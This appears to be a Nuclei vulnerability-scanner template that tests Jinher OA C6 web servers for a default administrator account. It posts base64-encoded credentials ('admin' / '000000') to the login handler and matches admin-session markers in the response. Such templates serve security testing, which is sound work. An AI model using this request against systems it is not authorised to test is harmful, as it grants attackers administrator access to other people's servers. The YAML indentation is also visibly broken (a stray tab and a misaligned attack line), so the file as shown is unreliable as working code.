id: jinher-oa-c6-default-password

info:
  name: Jinher oa C6 Default Password
  author: ritikchaddha
  severity: high
  description: Jinher-OA C6 default administrator account credential.
  tags: jinher,jinher-oa,default-login
  reference:
    - https://github.com/nu0l/poc-wiki/blob/main/%E9%87%91%E5%92%8COA-C6-default-password.md

requests:
  - raw:
      - |
        POST /c6/Jhsoft.Web.login/AjaxForLogin.aspx HTTP/1.1
        Host: {{Hostname}}
	Content-Type: application/x-www-form-urlencoded

        type=login&loginCode={{code}}&pwd={{pass}}

 attack: pitchfork
    payloads:
      code:
        - YWRtaW4=&
      pass:
        - MDAwMDAw&

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "\xcf\xb5\xcd\xb3\xb9\xdc\xc0\xed\xd4\xb1\x7c"
          - "\xc4\xfa\xba\xc3\x7c\x7c\x7c"
        part: body
        condition: and

      - type: word
        words:
          - "Set-Cookie= SessionIDAdmin="
        part: header

      - type: status
        status:
          - 200
